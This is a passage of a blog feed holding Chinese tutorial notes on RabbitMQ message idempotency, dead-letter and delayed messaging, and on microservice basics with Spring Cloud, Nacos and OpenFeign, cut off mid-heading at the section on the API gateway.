不一样，前者是作回执用的 ID，它和消费 ID 可以保持消费不一致；</p></blockquote><p>我们可以在定义消息转换器时显式声明让 MQ 创建全局唯一的 Message ID：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MessageCoverter <span class="title function_">messageConverter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Jackson2JsonMessageConverter</span> <span class="variable">jmc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    jmc.setCreateMessageIds(<span class="literal">true</span>);    <span class="comment">/* 默认 false */</span></span><br><span class="line">    <span class="keyword">return</span> jmc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 Message ID 会存放在 Message 的 Properties 中（不是我们常用的 Payload 中），所以需要我们单独去取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 都需要转换，所以直接使用 Message 类型接收，就能收到 properties 数据 */</span></span><br><span class="line"><span class="meta">@RabbitListener(/* ... */)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">consumer</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">    message.getBody();     <span class="comment">/* 返回 byte[] */</span></span><br><span class="line">    message.getMessageProperties();    <span class="comment">/* MessageProperties */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>byte[]</code> 中如果原来是字符串，则可以直接用字符串构造函数构造；</p><p>如果是 自定义的对象，并且使用了 <code>Jackson2JsonMessageConverter</code>，直接用配套的 <code>ObjectMapper</code> 解析就行；</p></li><li><p><code>MessageProperties.getMessageId()</code> 就能获取其中的 <code>message-id</code> 属性（如果有）；</p></li></ul><p>缺点：</p><ul><li><p>业务逻辑嵌入和耦合。给业务引入了原本不需要的逻辑，造成耦合；</p></li><li><p>数据库写影响原本业务性能；</p></li></ul><h3 id="2-4-2-业务逻辑本身判断"><a href="#2-4-2-业务逻辑本身判断" class="headerlink" title="2.4.2 业务逻辑本身判断"></a>2.4.2 业务逻辑本身判断</h3><p>上面的方法虽然通用，但是是侵入式的解决方案。如果业务逻辑允许，我们可以根据原有的业务逻辑判断这次消息是否被处理过。</p><blockquote><p>相当于做了非幂等业务的保护流程。</p><p>例如对于订单业务，如下图，如果在交易服务中的 “标记订单为已支付”，如果用户在支付成功后，“标记订单已支付” 以及完成，正在向 MQ 发送 <code>ACK</code> 时断开连接。此时 MQ 认为消费者未收到。</p><p>如果用户此时发起了退款，交易服务立即更改为退款中，此后 MQ 的连接又恢复了，如果不作处理，则 “已支付” 的状态会覆盖 “退款中” 的状态。</p><p><img src="imgs/pe-example.png" width="400px"></p><p>这种情况除了使用 Message ID 的方法，还可以直接检查 “标记订单已支付” 之前的订单状态，毕竟根据业务逻辑，只有未支付的订单才会需要标记成已支付：</p><p><img src="imgs/pe-example-sol.png" width="600px"></p></blockquote><p> 总结一下：</p><p>如何保证支付服务与交易服务之间的订单状态一致性？</p><ul><li><p>首先，支付服务会正在用户支付成功以后利用 MQ 消息通知交易服务，完成订单状态同步；</p></li><li><p>其次，为了保证 MQ 消息的可靠性，我们采用了发送者确认机制、消费者确认、消费者失败重试等策略，确保消息投递和处理的可靠性。同时也开启了 MQ 的持久化，避免因服务宕机导致消息丢失；</p><blockquote><p>保证消费者至少消费一次。</p></blockquote></li><li><p>最后，我们还在交易服务更新订单状态时做了业务幂等判断，避免因消息重复消费导致订单状态异常。</p></li></ul><p>上面的策略已经比较完善了，但是还是可能存在问题：我们的机制没有问题，但是网络原因，MQ 和消费者间真的一直都没办法建立连接，能否有个兜底机制，至少确保关键的业务（例如支付）数据一致性？</p><h2 id="2-5-延迟任务和延迟消息"><a href="#2-5-延迟任务和延迟消息" class="headerlink" title="2.5 延迟任务和延迟消息"></a>2.5 延迟任务和延迟消息</h2><p>延迟任务是消息一致性的一种兜底方案。</p><p>延迟消息：<strong><u>发送者发送消息时指定一个时间，消费者不会立刻收到消息，而是在指定时间之后才收到消息。</u></strong></p><p>以下单举例：</p><p><img src="imgs/delay-example.png" width="600px"></p><p>假设交易服务和支付服务间暂时一直无法连接，是否有机制确保二者间的消息一致？</p><p>我们可以引入超时时间的概念，一段时间后，再次向支付服务查询如果成功就改变状态；如果失败则取消。</p><p>在 Rabbit MQ 中可以借助插件来完成延迟任务（默认不支持）。</p><h3 id="2-5-1-死信交换机（dead-letter）"><a href="#2-5-1-死信交换机（dead-letter）" class="headerlink" title="2.5.1 死信交换机（dead-letter）"></a>2.5.1 死信交换机（dead-letter）</h3><p>当一个队列中的消息满足下列情况之一时，就会成为死信（dead letter）：</p><ul><li>消费者使用 <code>REJECT</code> 或 <code>NACK</code> 声明消费失败并且消息的 <code>requeue</code> 参数设置为 <code>false</code> / 使用失败重试机制的 Message Recoverer 是 <code>RejectAndDontRequeueRecoverer</code>；</li><li>消息是一个过期消息（达到了队列或消息本身设置的过期时间），超时无人消费；</li><li>要投递的队列消息堆积满了，最早的消息可能成为死信；</li></ul><p>我们可以在声明交换机时，给定一个属性 <code>dead-letter-exchange</code>，并且与某个队列绑定，那么该队列中的死信就会自动投递到这个交换机中；</p><p>我们可以利用死信交换机的 “超时” 特性，实现延时任务：</p><p><img src="imgs/dead-letter-meme-delay.png"></p><p>我们可以对某个队列声明死信交换机，直接使用 <code>QueueBuilder</code> 的方式定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QueueBuilder</span><br><span class="line">    .durable(&lt;queue name&gt;)</span><br><span class="line">    .deadLetterExchange(&lt;dlx exchange name&gt;)</span><br><span class="line">    .build()</span><br></pre></td></tr></table></figure><p>最后，我们还有在发送消息时还需要指定消息的过期时间，确保最终以规定时间进入死信交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitTemplate.convertAndSend(&lt;normal direct&gt;, &lt;key&gt;, &lt;object&gt;, &lt;post process&gt;)</span><br></pre></td></tr></table></figure><p>在最后一个参数中，传入一个 <code>MessagePostProcessor</code> 函数接口的实现，即可在 object 转换为 <code>Message</code> 对象后再进行处理，以设置超时时间。因为<strong><u>超时时间也位于 Message 的 Properties 中</u></strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">MessagePostProcessor</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">postProccessMessage</span><span class="params">(Message message)</span> <span class="keyword">throws</span> AmqpException &#123;</span><br><span class="line">        message.getMessageProperties().setExpiration(<span class="string">&quot;10000&quot;</span> <span class="comment">/* 字符串表示的 ms */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 也可以换成 lambda 表达式 */</span></span><br></pre></td></tr></table></figure><h3 id="2-5-2-Rabbit-MQ-延时任务插件"><a href="#2-5-2-Rabbit-MQ-延时任务插件" class="headerlink" title="2.5.2 Rabbit MQ 延时任务插件"></a>2.5.2 Rabbit MQ 延时任务插件</h3><p>需要在 <code>mq-plugins/_data</code> 中加入插件，并且配置 <code>enabled_plugins</code> 文件，加入 <code>rabbitmq_delayed_message_exchange</code> 即可；</p><p>然后，我们需要设置某个交换机的属性为 <code>delayed</code>：</p><ul><li>如果使用 Bean 配置，那么就用 <code>ExchangeBuilder</code> 添加 <code>delayed()</code> 方法；</li><li>如果使用 <code>@RabbitListener(bindings)</code> 的配置，就在 <code>@Exchange</code> 中加入 <code>delayed = &quot;true&quot;</code>；</li></ul><p>最后给要发送的消息指定 properties <code>x-delay</code>，同样使用 post processor，此时对 Message Properties 调用 <code>setDelay(&lt;ms&gt;)</code> （不是 <code>setExpiration</code>）即可；</p><blockquote><p>注意：无论是延时消息，还是死信的生成，其计时依赖 CPU 时钟，所以是 CPU 密集型任务。</p><p>如果超时时间 / 过期时间设置过长，都会导致需要计时的消息大量积压，影响 MQ 性能。</p><p><strong><u>所以无论是死信交换机中的过期时间，还是延时任务的延时时间，都不宜设置过长。</u></strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-背景&quot;&gt;&lt;a href=&quot;#Chapter-0-背景&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. 背景&quot;&gt;&lt;/a&gt;Chapter 0. 背景&lt;/h1&gt;&lt;h2 id=&quot;0-1-同步消息和异步消息&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="MQ" scheme="https://blog.sjtuxhw.top/tags/MQ/"/>
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Microservice" scheme="https://blog.sjtuxhw.top/tags/Microservice/"/>
    
  </entry>
  
  <entry>
    <title>微服务初探</title>
    <link href="https://blog.sjtuxhw.top/technical/micro-service-basic/"/>
    <id>https://blog.sjtuxhw.top/technical/micro-service-basic/</id>
    <published>2024-05-21T03:27:40.000Z</published>
    <updated>2024-10-25T14:02:45.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-基本概念"><a href="#Chapter-0-基本概念" class="headerlink" title="Chapter 0. 基本概念"></a>Chapter 0. 基本概念</h1><ul><li>微服务是一种软件架构风格。专注于单一职责的小型业务为基础，组成复杂大型应用。</li><li>需要解决的问题：服务拆分、远程调用（RPC）、服务治理（可用性与调度）、请求路由、身份认证、配置管 理、分布式事务（一致性问题）、异步通信……</li><li>优点和特征：粒度小、单服务开发便捷，团队自治，服务自治，系统耦合性低；</li><li>缺点：跨模块开发难度大，运维成本高；</li></ul><blockquote><p>对比而言，单体架构：</p><ul><li>优点：架构简单、部署成本低（适用于开发功能相对简单、规模较小的项目）；</li><li>缺点：团队协作成本高，系统发布效率低、系统可用性差（软件可靠性差）；</li></ul></blockquote><ul><li>对应框架：Spring Cloud，全球范围广泛使用的微服务框架；<ul><li>服务注册发现组件：Eureka、Nacos、Consul……</li><li>服务远程调用（RPC）；OpenFeign、Dubbo……</li><li>服务链路监控：Zipkin、Sleuth……</li><li>统一配置管理：Spring Cloud Config、Nacos……</li><li>统一网关路由：Spring Cloud Gateway、Zuul……</li><li>流控、降级、保护：Hystix、Sentinel……</li></ul></li></ul><h1 id="Chapter-1-基于实践学习：将单体架构拆分"><a href="#Chapter-1-基于实践学习：将单体架构拆分" class="headerlink" title="Chapter 1. 基于实践学习：将单体架构拆分"></a>Chapter 1. 基于实践学习：将单体架构拆分</h1><h2 id="1-1-基本思路"><a href="#1-1-基本思路" class="headerlink" title="1.1 基本思路"></a>1.1 基本思路</h2><ul><li>拆分时机：<ul><li>创业项目：先使用单体架构，快速开发、试错；规模扩大后再拆分；</li><li>确定的大型项目：资金充足，目标明确，直接选择微服务架构；</li></ul></li><li>拆分原则：<ul><li>高内聚：每个微服务的职责尽量单一，包含的业务相互关联度高、<strong>完整度高</strong>；</li><li>低耦合：每个微服务的功能要相对独立，尽量减少对其他微服务的依赖；</li></ul></li><li>拆分方式：<ul><li>纵向拆分：按业务模块拆分（用户认证管理、订单管理……）；</li><li>横向拆分：抽取公共服务，提高复用性（用户登录、订单管理中有公共服务，例如风控、日志服务）；</li></ul></li></ul><blockquote><p>具体如何拆分何种模式？</p><ul><li><p>独立 Project：一个单体架构的项目拆分后，将每个 service 放在一个独立 Project 内；</p><p>优点：相当解耦，关联度更低；</p><p>缺点：对于小型项目而言仓库管理臃肿费力；</p><p>适用：大型项目，每个 service 的业务逻辑相当复杂；</p></li><li><p>Maven 聚合：一个单体项目拆分后，所有 service 都存放在一个 project 中，这个 project 专门用于管理依赖，每个 service 都是 project 的一个 module；</p><p>适用：中小型项目，敏捷开发；</p></li></ul></blockquote><h2 id="1-2-远程调用-RPC：以-Spring-RestTemplate-为例"><a href="#1-2-远程调用-RPC：以-Spring-RestTemplate-为例" class="headerlink" title="1.2 远程调用 RPC：以 Spring RestTemplate 为例"></a>1.2 远程调用 RPC：以 Spring <code>RestTemplate</code> 为例</h2><p>拆分的问题：经常会遇到一个服务依赖另一个服务的情况。这可以直接通过服务间远程调用（RPC）来完成。</p><blockquote><p>远程调用 RPC 更像是一种软件协议，能<strong><u>让一个程序和本地执行流程一样，在远端执行一段代码</u></strong>。</p><p>在软件工程原理的 23 个设计模式中，更像是利用了 Proxy 设计模式。调用者无需关心远程信息交互的具体细节，只需按照接口像调用本地服务一样即可完成目标。</p></blockquote><p>在 Spring 中，一种轻量级的远程调用的方法是，使用接口：<code>RestTemplate</code>，调用它就相当于在 Java 代码中向 RESTful API 发送网络请求并且获取回复。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">exchange</span><span class="params">(</span></span><br><span class="line"><span class="params">    String url,</span></span><br><span class="line"><span class="params">    HttpMethod method,</span></span><br><span class="line"><span class="params">    <span class="meta">@Nullable</span> HttpEntity&lt;?&gt; requestEntity,    <span class="comment">/* request body */</span></span></span><br><span class="line"><span class="params">       Class&lt;T&gt; responseType,</span></span><br><span class="line"><span class="params">    Map&lt;String, ?&gt; uriVariables</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>规避类型擦除：<code>new ParameterizedTypeReference&lt;T&gt;() &#123;&#125;</code>；</p></blockquote><p>但是有一些不可避免的问题：</p><ul><li>若代码中写死 <code>url</code>，则 负载均衡、可用性轮换等等策略全部失效；</li><li>若业务逻辑中的远程调用的部分较多，则 <code>RestTemplate</code> 对象散落各处不方便维护；</li><li>……</li></ul><p>于是我们需要更严格、复杂的架构将服务间的远程调用管理起来。一种思路就是 “<strong><u>发布-订阅者模式</u></strong>”；</p><h2 id="1-3-微服务的注册与发现机制"><a href="#1-3-微服务的注册与发现机制" class="headerlink" title="1.3 微服务的注册与发现机制"></a>1.3 微服务的注册与发现机制</h2><h3 id="1-3-1-发布-订阅模式（架构）"><a href="#1-3-1-发布-订阅模式（架构）" class="headerlink" title="1.3.1 发布-订阅模式（架构）"></a>1.3.1 发布-订阅模式（架构）</h3><p>发布-订阅者模式（pub-sub pattern）；</p><p><img src="imgs/pub-sub.png"></p><p>The Pub/Sub (Publisher/Subscriber) model is a messaging pattern used in software architecture to facilitate asynchronous communication between different components or systems. In this model, publishers produce messages that are then consumed by subscribers.</p><p>发布-订阅模型，作为一种消息传递模式，用在一些软件架构中，来实现不同组件、系统间的<strong><u>异步通信</u></strong>。</p><ul><li><p>subscribers：消息的获取方，publishers：消息生产方；</p></li><li><p>topics：一种订阅频道 / 分类（channels / categories）；</p><p>发布者可以按照消息的业务含义为消息打上话题标签（并且无需知道订阅者的特性），而订阅者可以按照 topics 来订阅、获取部分感兴趣的消息（并且无需知道发布者的特性）；</p><p>Topics help categorize messages and enable targeted message delivery to interested subscribers.</p></li><li><p>message brokers：一种中间件/中间人（intermediaries），负责在 publishers 和 subscribers 间使用合适的策略传递消息（调度队列、延时……）；</p><ul><li>message brokers 可以按 topics 维护一些消息队列；</li><li>确保消息发送给正确的订阅者，并且提供额外的特性：<strong><u>消息持久化、可扩展性、可靠性</u></strong>；</li></ul></li><li><p>message：可以是任何形式的数据信息（text, JSON, binary, etc）；</p></li><li><p>subscription：订阅代表了 subscriber 和某个 topics 建立的一个关联。它定义了：</p><ul><li>订阅者订阅了什么 topic 的消息；</li><li>订阅设置，例如是否事务、是否有订阅内容保证（at-most-once / at-least-once）等等；</li></ul></li></ul><p>发布-订阅模型的理论过程：</p><ol><li>发布者创建并发送消息给 pub/sub system，并且根据消息内容类型放入指定 topic 或者说 channel 中；</li><li>订阅者向 pub/sub system 表达需要订阅某个/些 topic 的意愿，有信息就会收到；</li><li><p>message brokers 根据收到发布者的 topic 对收到的消息分类，再根据所有 topics 的订阅情况 forward 给所有订阅了这个 topic 的 subscribers；</p></li><li><p>以上过程全部异步，发布者不需要关心订阅者的状态即可发布；订阅者无需关心发布者的状态即可接受消息。</p></li></ol><p>发布-订阅模型的优势：</p><ul><li>decoupling &amp; scalability：将消息生产方和消息接受方解耦，不仅无需关心对方状态和交互细节，而且 scalable，便捷地增减 publishers 和 subscribers 的数量而无需影响现有组件；</li><li>asynchronous communication：异步通信能力；</li><li>event-driven architecture：发布者和订阅者互不耦合，但发布者的事件行为可以影响订阅者；</li><li>dynamic subscription：允许运行时动态更换订阅，去耦合，全面的灵活性；</li></ul><p>发布-订阅模型的适用场景：</p><ul><li>消息队列系统；</li><li>需要构建 scalable web app 的时候，尤其是在线文档、实时更新的场景；</li><li>微服务架构间的远程通信；</li><li>……</li></ul><p>发布-订阅模型不应该使用的场景：</p><ul><li>对交互时延有极强需求的场景，例如游戏；</li><li>低复杂度的交互场景，例如系统只有两个组件间的交互，贸然引入会增大不必要的复杂度；</li><li>……</li></ul><p>回到微服务远程调用的主题上。为了确保服务远程调用的灵活性、可用性，我们可以借鉴 发布-订阅者模式，通过注册、发现、订阅的流程，动态调度服务的访问方式。</p><p>这样既可以有效地、统一地管理远程访问，提升可维护性，又可以便捷地进行调度，充分利用服务资源。</p><h3 id="1-3-2-注册中心"><a href="#1-3-2-注册中心" class="headerlink" title="1.3.2 注册中心"></a>1.3.2 注册中心</h3><p>在微服务架构中，规避微服务间直接远程调用缺陷的一种方式就是引入注册中心机制，借鉴发布-订阅模式，引入注册中心后的主要步骤如下：</p><ol><li>服务发布者向注册中心注册服务信息（提供何种服务，即 topic，还有地址在哪里）；</li><li>服务订阅者向注册中心订阅感兴趣的服务。此时注册中心可以将<strong><u>当前可用的</u></strong>发布者信息告诉订阅者；</li><li>订阅者（或者注册中心）可以进行负载均衡，选择一个发布者向其请求服务（远程调用）。</li></ol><p>由于我们利用了发布-订阅模式，所以即便是已经获取服务列表的订阅者，也能从注册中心实时获取当前发布者的可用情况。例如：</p><blockquote><p>假设订阅者从注册中心获取了 3 个可能的服务发布者，但是一段时间后其中一个服务提供方 A 宕机。</p><p>这个时候 A 不再通过注册中心的 health check（heart beat），注册中心认为 A 不再有效，于是向所有订阅了 A 服务所在 topic 的所有订阅者推送变更。</p><p>这就保证了订阅者订阅列表的有效性。创建了新的服务实例也是如此！实现了 scalable service，随意增减服务实例数量、负载均衡。</p></blockquote><hr><p>在代码方面，我们知道在 Spring Cloud 中，注册中心有很多实现，例如 Alibaba 的 Nacos，Netflix 的 Eureka。我们就以其中的 Nacos 为例。我们只需要将注册中心部署在固定 IP 的服务器上即可。</p><p>配置好 Nacos，在注册服务客户端（也就是提供服务方）引入 nacos 注册发现服务，还需要对 Spring 进行配置，指定 registry server 的地址和需要的服务名。最后启动这个服务实例即可完成注册！</p><p>而在服务调用端，需要在项目中引入 Nacos Client，它实现了 Spring Cloud 的 <code>DiscoveryClient</code> 接口。</p><p>我们直接注入 <code>DiscoverClient</code>，使用如下方法：</p><ul><li><code>DiscoverClient.getInstances(String serviceName) -&gt; List&lt;ServiceInstance&gt;</code>，<code>serviceName</code> 是服务提供方在 Nacos 中注册的服务名；</li><li>而我们可以通过 <code>ServiceInstance</code> 获取 <code>uri / host / port</code> 信息，手动写负载均衡或其他处理工作。</li></ul><blockquote><p>注：Nacos 需要导入依赖 <code>spring-cloud-starter-alibaba-nacos-discovery</code>，并且进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">nacos.server-addr:</span> <span class="string">...</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="1-3-3-更优雅的远程调用：OpenFeign"><a href="#1-3-3-更优雅的远程调用：OpenFeign" class="headerlink" title="1.3.3 更优雅的远程调用：OpenFeign"></a>1.3.3 更优雅的远程调用：OpenFeign</h3><h4 id="初步认识-OpenFeign"><a href="#初步认识-OpenFeign" class="headerlink" title="初步认识 OpenFeign"></a>初步认识 OpenFeign</h4><p>但是这里有个问题，我们通过 <code>DiscoverClient</code> 获取可用服务列表，然后再处理一系列可能的异常，然后还要手写 <code>RestTemplate</code> 进行远程调用，最后才能访问服务！</p><p>如此繁琐的远程调用，我们应该进行封装！好在同样有框架能够更轻松地帮助我们完成远程调用：OpenFeign；</p><blockquote><p>注：我们还要对负载均衡算法进行封装。使用 Spring cloud load balancer 就能解决问题。</p></blockquote><p>引入 OpenFeign 的方法如下：</p><ul><li><p>引入 OpenFeign 依赖；</p></li><li><p>在 Springboot Application 启动类注解 <code>@EnableFeignClients</code> 启用 OpenFeign 的特性；</p></li><li><p>定义接口，用于指定要远程调用的服务名、远程调用服务名的 endpoint。举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;item-service&quot;)</span>    <span class="comment">/* 需要向注册中心申请的服务名 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ItemClient</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 告诉 OpenFeign 需要连接远程服务的 endpoint 相当于指定 RestTemplate 的 uri 和 HttpMethod */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/items&quot;)</span></span><br><span class="line">    <span class="comment">/* 告诉 OpenFeign 的传入参数、请求体信息，以及服务返回 JSON 对应的类型，相当于指定 RestTemplate 的 RequestEntity，responseType，uriVariables */</span></span><br><span class="line">    List&lt;ItemDto&gt; <span class="title function_">queryItemByIds</span><span class="params">(<span class="meta">@RequestParam(&quot;ids&quot;)</span> Collection&lt;Long&gt; ids)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这样相当于实现了 proxy 设计模式（这个 interface 对应 Spring 生成的实例就是 proxy），在调用远程服务就像调用本地服务一样简单！</p><h4 id="OpenFeign-连接池优化"><a href="#OpenFeign-连接池优化" class="headerlink" title="OpenFeign 连接池优化"></a>OpenFeign 连接池优化</h4><p>OpenFeign 的底层实现非常类似我们手动使用 <code>DiscoverClient</code>，并且考虑负载均衡、服务异常的情况。</p><p>感兴趣的同学可以步进调试观察其底层行为。</p><p>值得注意的是，OpenFeign 底层默认的远程调用的方式是利用 <code>HttpURLConnection</code> 类（位于 <code>FeignBlockingLoadBalancerClient</code> 的 <code>delegate</code> 成员变量），而这个 Java 内置类比较底层，不支持连接池，不像 apache 的 <code>HttpClient</code> 和 <code>OkHttp</code>，可能造成资源利用率较低。</p><p>好在我们可以为 OpenFeign 的底层请求更换具有连接池的连接类，这样可以减小创建和销毁连接的开销，有助于提升程序性能。只需导入依赖相应依赖（例如 <code>feign-okhttp</code>），并且在 <code>application.yaml/properties</code> 中配置开启即可（例如 <code>feign.okhttp.enabled = true</code>）；</p><blockquote><p>注意，是在 OpenFeign 调用方模块设定才有效！</p></blockquote><h4 id="OpenFeign-最佳实践"><a href="#OpenFeign-最佳实践" class="headerlink" title="OpenFeign 最佳实践"></a>OpenFeign 最佳实践</h4><p>到这里仍然没有结束，我们还需要知道 OpenFeign 框架的最佳实践。</p><p>上面介绍引入 OpenFeign 的方法实际上是有严重问题的。我们发现，当单体架构的程序被拆成微服务后，有可能多个服务依赖同一个微服务，难不成所有用到的微服务都要定义一遍像 <code>ItemClient</code> 一样的接口？</p><p>我们知道，代码重复是大忌，这不仅降低了可维护性（增添维护人员心智负担）、可扩展性（修改繁琐，不对修改开发），还降低了代码可读性和正确性。</p><p>正确使用 OpenFeign 的方案有几种：</p><ul><li><p>直接交给服务提供方编写 Feign Client，将服务提供方拆成 3 个模块：</p><ul><li><code>DTO</code> 中包含向服务调用方返回的数据类型；</li><li><code>api</code> 中包含 <code>FeignClient</code> 接口以供调用；</li><li><code>blz</code> 中包含原先的代码业务逻辑；</li></ul><p>最后其他服务只需引用该服务为依赖即可。</p><p>优点：代码逻辑更合理，易于维护，耦合度更低；</p><p>缺点：项目结构更复杂、编写麻烦；</p></li><li><p>创建一个不属于任何一个微服务模块的、同级的 <code>api</code> module，专门管理 <code>FeignClient</code>，主要包含：</p><ul><li><code>client</code>：所有微服务想要向外暴露的 <code>FeignClient</code>；</li><li><code>config</code>：所有微服务的配置类；</li><li><code>dto</code>：所有微服务想要返回的数据类型；</li></ul><p>优点：项目结构清晰，无需改动原先微服务；</p><p>缺点：代码耦合度增加，每个微服务模块都需要引入该模块为依赖（而前一种方法只需引入需要用的模块就行），所有微服务都需要和 <code>api</code> 一起开发；</p><p>但是如果以这种方式创建 <code>FeignClient</code>，没法完成依赖注入（因为 Spring Application 没法自主扫描本包以外的 bean），就需要手动指定接口类型，并将其纳入 IoC Container 中。两种方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在 SpringApplication 启动类启用 FeignClient 时显示指定 bean 类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方法一：为 Spring 指定 bean 扫描的包名（精确到子包） */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = &lt;package name&gt;)</span></span><br><span class="line"><span class="comment">/* 方法二：利用反射手动指定 bean 对应接口的 Class 类型 */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(clients = &#123; &lt;classname&gt;.class &#125;)</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="OpenFeign-日志管理"><a href="#OpenFeign-日志管理" class="headerlink" title="OpenFeign 日志管理"></a>OpenFeign 日志管理</h4><p>OpenFeign 框架默认情况下仅在 <code>FeignClient</code> 所在包配置的日志级别为 <code>DEBUG</code> 时才会输出日志，并且自身的日志级别是 <code>NONE</code>（不输出），故需要我们手动配置。</p><blockquote><p>注：OpenFeign 自身的日志级别有 4 种：<code>NONE / BASIC / HEADERS / FULL</code>；</p></blockquote><p>定义 OpenFeign 的日志级别需要完成两件事：</p><ol><li><p>定义配置类，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 没有 @Configuration / @Service 等注解，该 @Bean 不会被纳入 IoC Container */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Logger.Level <span class="title function_">feignLogLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将配置类配置给指定 / 全局的 <code>FeignClient</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 指定 FeignClient */</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;...&quot;, configuration = FeignConfig.class)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局 FeignClient 默认 */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(defaultConfiguration = FeignConfig.class)</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="1-4-微服务网关"><a href="#1-4-微服务网关" class="headerlink" title="1.4 微服务网关"></a>1.4 微服务网关</h2><p>在大致拆好微服务后，有个问题就随之出现：前端应该如何访问后端服务？难道前端还需要动态获取各个服务的地址？</p><p>肯定不能这样，我们的期望是前后端的解耦，就是说单体架构和微服务架构下，前端是无需改变的，只需要向固定的地址发送不同请求就能得到对应的响应，这就需要一个中间层来完成这个任务。</p><p>这个能将不同服务转发给某个符合条件的微服务的中间层就是网关。网关不仅能完成前面的 forward 的功能，还能<strong><u>配合注册中心</u></strong>进行负载均衡。</p><blockquote><p>功能：</p><ul><li>请求路由（路径针对什么微服务？）；</li><li>转发（帮忙将 HTTP 请求 forward 给某个动态地址的实例）；</li><li>身份校验（检查请求的 <code>Authorization</code> 是否合法）；</li></ul></blockquote><p>这样，我们就不需要在每个微服务中进行身份校验等繁琐工作了。更安全的是，后端微服务甚至不需要向外暴露端口了，只需暴露网关，大大增强安全性。</p><p>此外，引入网关后，后端实现了封装和解耦，在前端看来这和单体架构别无二致。</p><h3 id="1-4-1-微服务网关框架：Spring-Cloud-Gateway"><a href="#1-4-1-微服务网关框架：Spring-Cloud-Gateway" class="headerlink" title="1.4.1 微服务网关框架：Spring 